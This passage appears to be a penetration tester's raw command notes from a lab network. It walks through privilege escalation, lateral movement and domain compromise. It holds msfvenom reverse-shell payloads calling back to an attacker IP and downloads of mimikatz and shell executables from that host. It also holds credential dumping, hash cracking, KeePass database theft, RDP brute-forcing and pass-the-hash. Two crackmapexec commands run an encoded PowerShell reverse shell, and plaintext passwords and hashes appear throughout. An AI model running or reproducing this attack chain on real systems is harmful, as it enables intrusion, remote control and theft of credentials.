File: "C:\Program Files\KeePass Password Safe 2\KeePass.config.xml"
```

.15 privesc
```
# find script that puts exe in dir. edit to put reverse shell exe into dir
nodepad.exe schedule.ps1

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9997 -f exe -o beyondupdater.exe

iwr -uri http://192.168.45.219:8000/beyondupdater.exe -Outfile beyondupdater.exe
nc -nvlp 9997
```

.15 post exploitation
```
iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# get milana hash 2237ff5905ec2fd9ebbdfa3a14d1b2b6 - not able to crack it
hashcat -m 1000 milana.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# get offsec hash - cf998001c44803b490a46f363a2ca812
hashcat -m 1000 offsec.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# check for kdbx as we know keepass is there from earlier enumeration
Get-ChildItem -Path C:\Users\milana\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.conf -File -Recurse -ErrorAction SilentlyContinue

# copy kdbx to kali
impacket-smbserver -smb2support smb smb 
net use \\192.168.45.219\smb
copy Database.kdbx \\192.168.45.219\smb

# get pw destiny1
keepass2john Database3.kdbx > keepass3.hash
hashcat -m 13400 keepass3.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

kpcli --kdb=/home/kali/relia/Database3.kdbx
cd /Database
show 0 # get ssh key, user:sarah, password:placeholder

# we find there is no password
ssh2john sarah_rsa > sarah.hash

# what has ssh open
nmap -p 22,2222 -Pn 172.16.78.6 172.16.78.19-21 172.16.78.30

# only 19 and 20 have port 22 open - 19 works, 20 is asking for password
ssh -i sarah_rsa sarah@172.16.136.19

# lets try passing NTLM using smb
nmap -p 445 -Pn 172.16.136.6 172.16.136.19-21 172.16.136.30

# open on 6,21,30
# works on 21
impacket-smbclient milana@172.16.136.21 -hashes 00000000000000000000000000000000:2237ff5905ec2fd9ebbdfa3a14d1b2b6

# works on .30
crackmapexec smb 172.16.136.19-20 172.16.136.30 -u andrea -p 'PasswordPassword_6' --continue-on-success
crowbar -b rdp -s 172.16.78.30/32 -u andrea -c "PasswordPassword_6" -n 1

# got password vau!XCKjNQBv2$ for Administrator
# RDP works on .6 only
crowbar -b rdp -s 172.16.78.6/32 -u Administrator -C admin-password.txt -n 1
crowbar -b rdp -s 172.16.78.30/32 -u Administrator -C admin-password.txt -n 1
xfreerdp /cert-ignore /u:Administrator /p:"vau\!XCKjNQBv2\$" /v:172.16.78.6

# Administrator is admin on .19(FILES) and 30(WEBBY)
crackmapexec smb 172.16.78.19-20 172.16.78.30 -u Administrator -p admin-password.txt --continue-on-success

# what has smb open - .6, .21, .30
nmap -p 445 -Pn 172.16.78.6 172.16.78.19-21 172.16.78.30

# what has rdp open - .6, .30
nmap -p 3389 -Pn 172.16.78.6 172.16.78.19-21 172.16.78.30
```

.19 enumeration
```
ssh -i sarah_rsa sarah@172.16.78.19

# find amy user

# sudo -l
# find we have nopassword on some borg commands

# did not work
scp -i sarah_rsa -r /usr/share/unix-privesc-check sarah@172.16.78.19:/home/sarah
./unix-privesc-check standard > output.txt

scp -i sarah_rsa linpeas.sh sarah@172.16.78.19:/home/sarah

# from linpeas
/etc/sudoers.d/sarah.bak.
sudo -v

# does not work - target is patched
scp -i sarah_rsa -r exploit-nss.py sarah@172.16.78.19:/home/sarah

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f sh -o shell
scp -i sarah_rsa -r shell sarah@172.16.78.19:/home/sarah

find / -name *backup 2>/dev/null
find / -name *borg 2>/dev/null
find / -name borg* 2>/dev/null

# use pspy to spy on crons to get the passphrase
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
scp -i sarah_rsa -r pspy64 sarah@172.16.78.19:/home/sarah

# password = xinyVzoH2AnJpRK9sfMgBA
sudo borg list /opt/borgbackup
# from the output of list we find the home is backed up
# the media/usb things are useuelss
sudo borg extract /opt/borgbackup::usb_1701365194 
sudo borg list /media/usb0 

# need to output to a file in our user's home dir, otherwise it's root perms
sudo borg extract /opt/borgbackup::home --stdout > extracted.home

# found passwords
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/

"user": "amy",
"pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"

# what type of hash is ^
hashid amy.hash
hash-identifier
john --list=formats

# we find md5 hash - password: backups1
hashcat -m 0 amy.hash /usr/share/wordlists/rockyou.txt -r rule1

# can switch users with
su amy

# cannot ssh with this user
nmap -sT -p 10000-30000 -Pn 172.16.78.19

# scan a bit faster using T (5=insane)
# sS (stealth) scan is faster because it doesn't wait for ack
nmap -p 10000-30000 -Pn 172.16.78.19 -T 5 --verbose
```

Machines left: .20, .21 (accessed smb already, but no flags), .30 

.20 enumeration
```
nmap -Pn 172.16.78.20 -T 5 --verbose

# Rb9kNokjDsjYyH
ssh andrew@172.16.78.20

scp linpeas.sh andrew@172.16.78.20:/home/andrew
scp pspy64 andrew@172.16.78.20:/home/andrew
# findings
/usr/local/etc/mysql/my.cnf
doas program

find / -type f -name "doas.conf" 2>/dev/null
# Permit members of the wheel group to perform actions as root.
permit nopass :wheel

# Allow david to run id command as root without logging it
# permit nolog david as root cmd id

permit nopass andrew as root cmd service args apache24 onestart

# apache is at
cd /usr/local/www/apache24

doas -u root service apache24 onestart

# on this box the script can't detect the OS
scp shell.php andrew@172.16.78.20:/usr/local/www/apache24/data/phpMyAdmin/tmp
scp linux-shell.php andrew@172.16.78.20:/usr/local/www/apache24/data/phpMyAdmin/tmp

# pretty useless
scp -r /usr/share/unix-privesc-check andrew@172.16.78.20:/home/andrew

# was able to just read the root directory

# in freeBSD wheel is the only group that can sudo so we want to add the user to that group
/usr/local/bin/doas pw group mod wheel -m andrew
```

.6 (domain controller) post exploitation
```
xfreerdp /cert-ignore /u:Administrator /p:"vau\!XCKjNQBv2\$" /v:172.16.78.6

iwr -uri http://192.168.45.219:8000/shell.exe -Outfile shell.exe
nc -nvlp 9999

iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
lsadump::sam
```
.30
```
# Administrator pw for 30 - vau!XCKjNQBv2$

crowbar -b rdp -s 172.16.78.30/32 -u mountuser -C "DRtajyCwcbWvH/9" -n 1
crowbar -b rdp -s 172.16.78.30/32 -u Administrator -C admin-password.txt -n 1

# success
crackmapexec smb 172.16.104.30 -u Administrator -p admin-password.txt --continue-on-success

# winrm is at 5986/5985 - in this case does not work
crackmapexec winrm 172.16.104.30 -u Administrator -p admin-password.txt --continue-on-success

# we can execute commands directly via crackmap smb since RDP/winrm do not work
crackmapexec 172.16.78.30 -u Administrator -p admin-password.txt -X whoami

crackmapexec smb  172.16.104.30 -u Administrator -p admin-password.txt -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

.21
```
# found creds on 20
sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.104.21
ssh mountuser@172.16.78.21

crackmapexec smb 172.16.104.21 -u Administrator -p admin-password.txt --continue-on-success

crackmapexec smb  172.16.104.21 -u Administrator -p admin-password.txt -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```